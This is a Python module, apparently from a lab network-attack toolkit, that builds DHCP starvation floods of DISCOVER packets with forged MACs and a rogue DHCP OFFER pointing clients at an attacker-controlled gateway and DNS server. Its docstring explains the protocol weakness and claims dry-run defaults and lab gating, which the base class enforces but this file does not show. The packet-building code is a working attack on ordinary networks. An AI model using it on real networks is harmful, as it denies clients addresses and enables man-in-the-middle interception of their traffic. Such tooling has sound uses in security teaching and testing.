"""DHCP starvation and rogue-offer (lab-only).

Protocol weakness
-----------------
DHCP (RFC 2131) hands out leases to whoever asks, identified only by the
client's chosen MAC address (the ``chaddr``/client-id). There is no
authentication in either direction:

* **Starvation.** An attacker floods the server with DISCOVER messages, each
  using a *different* fabricated MAC. The server reserves a lease for each one
  until its pool is exhausted. Legitimate clients can then no longer get an
  address.
* **Rogue offer.** Because clients also cannot authenticate the server, an
  attacker can race the real server and send their own OFFER — handing the
  client an attacker-controlled gateway/DNS, i.e. a man-in-the-middle.

What this module does
---------------------
``DhcpStarvationAttack`` builds a bounded burst of DISCOVERs with random MACs.
``RogueDhcpOffer`` builds a single forged OFFER. Both are rate-limited, default
to dry-run, and require the lab acknowledgement. Starvation targets the
broadcast domain (no single IP), so ``target_ip`` is ``None`` and only the lab
flag gates it.
"""

from __future__ import annotations

import random

from ..core.packets import BOOTP, DHCP, IP, UDP, Ether
from .base import Attack


def _mac_to_chaddr(mac: str) -> bytes:
    return bytes(int(b, 16) for b in mac.split(":"))


class DhcpStarvationAttack(Attack):
    name = "dhcp-starvation"
    target_ip = None  # broadcast-domain attack; gated by lab flag only

    def __init__(self, *, count: int = 20, seed: int | None = None, **kwargs) -> None:
        super().__init__(**kwargs)
        self.count = max(1, int(count))
        self._rng = random.Random(seed)

    def _rand_mac(self) -> str:
        first = (self._rng.randint(0x00, 0xFF) & 0xFE) | 0x02
        rest = [self._rng.randint(0x00, 0xFF) for _ in range(5)]
        return ":".join(f"{b:02x}" for b in [first, *rest])

    def build_packets(self) -> list:
        packets = []
        for _ in range(self.count):
            mac = self._rand_mac()
            disc = (
                Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
                / IP(src="0.0.0.0", dst="255.255.255.255")
                / UDP(sport=68, dport=67)
                / BOOTP(chaddr=_mac_to_chaddr(mac), xid=self._rng.randint(1, 0xFFFFFFFF))
                / DHCP(options=[("message-type", "discover"), "end"])
            )
            packets.append(disc)
        return packets


class RogueDhcpOffer(Attack):
    name = "dhcp-rogue-offer"

    def __init__(
        self,
        *,
        client_mac: str,
        offered_ip: str,
        server_ip: str,
        rogue_gateway: str,
        rogue_dns: str,
        **kwargs,
    ) -> None:
        # We are offering an address to the client; the offered IP is the
        # private target we validate.
        self.target_ip = offered_ip
        super().__init__(**kwargs)
        self.client_mac = client_mac
        self.offered_ip = offered_ip
        self.server_ip = server_ip
        self.rogue_gateway = rogue_gateway
        self.rogue_dns = rogue_dns

    def build_packets(self) -> list:
        offer = (
            Ether(src="de:ad:be:ef:00:01", dst=self.client_mac)
            / IP(src=self.server_ip, dst="255.255.255.255")
            / UDP(sport=67, dport=68)
            / BOOTP(
                op=2,
                yiaddr=self.offered_ip,
                siaddr=self.server_ip,
                chaddr=_mac_to_chaddr(self.client_mac),
            )
            / DHCP(
                options=[
                    ("message-type", "offer"),
                    ("server_id", self.server_ip),
                    ("router", self.rogue_gateway),
                    ("name_server", self.rogue_dns),
                    ("lease_time", 3600),
                    "end",
                ]
            )
        )
        return [offer]
